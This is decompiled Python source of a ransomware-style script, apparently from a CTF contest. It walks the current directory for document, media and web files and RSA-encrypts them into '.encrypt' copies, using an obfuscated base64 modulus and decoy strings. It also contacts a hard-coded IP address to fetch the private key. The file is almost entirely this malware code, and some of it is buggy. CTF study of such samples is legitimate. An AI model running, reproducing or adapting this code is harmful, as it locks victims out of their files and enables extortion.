# 2016.08.16 11:58:18 PDT
#Embedded file name: L:\DungBTb\DungBTb\exam ctf\contest 6\encrypt.py
import socket, os, string, random, re, base64, sys
import decrypt
SIZE_READ = 100

def long2hexstring(data):
    data = long(data)
    hex_string = hex(data).lstrip('0x').rstrip('L')
    return hex_string


def long2hexlist(data):
    tmp = hex(data).lstrip('0x').rstrip('L')
    if len(tmp) % 2 == 1:
        tmp = '0' + tmp
    hex_list = [ tmp[i:i + 2] for i in xrange(0, len(tmp), 2) ]
    return hex_list


def data2hexstring(data):
    hex_data = ''
    for char in data:
        tmp = ord(char)
        tmp = hex(tmp)[2:]
        if len(tmp) == 1:
            tmp = '0' + tmp
        hex_data += tmp

    return hex_data


def data2hexlist(data):
    hex_data = []
    for char in data:
        tmp = ord(char)
        tmp = hex(tmp)[2:]
        if len(tmp) == 1:
            tmp = '0' + tmp
        hex_data.append(tmp)

    return hex_data


def extension_():
    return ['.doc',
     '.docx',
     '.txt',
     '.mp4',
     '.mp3',
     '.jpg',
     '.jpng',
     '.flv',
     '.png',
     '.xlsx',
     '.ppt',
     '.pptx',
     '.pdf',
     '.html',
     '.php',
     '.jsp']


def getExponent():
    ee = ''
    Dantonz = 'ZnV6dQ=='
    jtyiel = 'Z2tkb318zz=='
    t = 65535
    if ee == '':
        return t + 2
    e = base64.b64decode(ee)
    return long(e, 16)


def getModule():
    nn = 'MTA1NjM1NzA'
    nn += '3OTk0MjE1Nzg1MDY0NTkyNjg4ODI5NDMxNjAzMjk1MDkyM'
    nn += 'D'
    Dantonz = 'ZnV6dQ=='
    nn += 'E5MzMyOTQxMzQwMjE4MDYzMDI0MD'
    nn += 'MwMjE0MTEyNDM1NDc3Mzg4OTU1NDcyMDc4MDYxOTY3MzY2NTkxMjc0NDM5NzE'
    nn += chr(ord('z')) + chr(ord('N'))
    jtyiel = 'Z2tkb318zz=='
    nn += 'zc2NTYzMjUxODI0MDA5NDI5'
    nn += 'OTEwNzk2OTI2MDA5OTQ1NjM5MzUzMDA3MzcxODU1NDEzOTkzOTg0Mzc5NTk4ODY4Njk2MTk1MTY0MDk5ODc5Mzk0MzQ2Nzg4MDY5OTQxNTQ1NzMxODEzMDk3MzMxMDE1MDU4Nzg2MjAxNjk3OTU4ODIyMzUzNTM4NDkwNzQ3NDI1NTI0NjE3NDM3MzU0MjY5NjY0NzY2OTA5NzYzNjc5Njg0MDQ3NDU0Njg4Mjc4MDExMDMx'
    n = base64.b64decode(nn)
    return long(n)


def random_int(length = 100):
    return random.randrange(length)


def decrypt():
    privateEx = getEx()


def getEx():
    s = socket.socket()
    server = ('118.70.186.203 ', 7337)
    s.connect(server)
    data_req = 'id=AOXo==&getEx=1'
    s.send(data_req)
    Ex = s.recv(500)
    return Ex


def init_spilt_string():
    spilt_s = ''
    printable = string.printable
    len_ss = random_int(len(printable))
    if len_ss <= 50:
        A = '@'
        spilt_s = printable[ord(A):printable.index(A)] + A
        spilt_s += chr(15) + chr(21)
    else:
        A = ord('@')
        spilt_s = printable[A:printable.index(chr(A))] + chr(A)
        spilt_s += chr(15) + chr(21)
    return spilt_s


def readFile(name):
    contents = []
    try:
        f = open(name, 'rb')
    except IOError:
        return []

    f.seek(0, os.SEEK_END)
    size = f.tell()
    num_kb = size / SIZE_READ
    f.seek(0)
    for i in xrange(num_kb):
        data = f.read(SIZE_READ)
        contents.append(data)

    data = f.read()
    contents.append(data)
    return contents


def rsa(data, e, n):
    e_data = long(data, 16)
    e_data = pow(e_data, e, n)
    return e_data


def check_data(data):
    check = re.findall('^[0]{1,}', data)
    return len(check) / 2


def encrypt(file, data_file, s_string):
    if len(data_file) == 0:
        return
    new_file = file + '.encrypt'
    open(new_file, 'a').close()
    o = open(new_file, 'wb')
    n = getModule()
    e = getExponent()
    for data in data_file:
        if data == '':
            continue
        data = data2hexstring(data)
        len_check = check_data(data)
        for i in xrange(len_check):
            o.write(chr(0))

        e_data = rsa(data, e, n)
        e_data_list = long2hexlist(e_data)
        for char in e_data_list:
            o.write(chr(int(char, 16)))

        for char in s_string:
            o.write(str(char))

    o.close()


def main():
    realpath = os.path.dirname(os.path.realpath(__file__))
    file_need_encrypt = []
    extension_parts = extension_()
    for root, directorys, files in os.walk('.'):
        for file in files:
            for extend in extension_parts:
                if re.search(extend + '$', file.lower()):
                    file_need_encrypt.append(os.path.join(root, file))

    if len(file_need_encrypt) == 0:
        return
    spilt_string = init_spilt_string()
    if len(sys.argv) == 2:
        if len(sys.argv[1] == 'decrypt'):
            decrypt()
    for file in file_need_encrypt:
        data_file = readFile(file)
        if len(data_file) == 1 and data_file[0] == '':
            continue
        if len(data_file) > 0:
            encrypt(file, data_file, spilt_string)


if __name__ == '__main__':
    main()
+++ okay decompyling encrypt.pyc 
# decompiled 1 files: 1 okay, 0 failed, 0 verify failed
# 2016.08.16 11:58:19 PDT
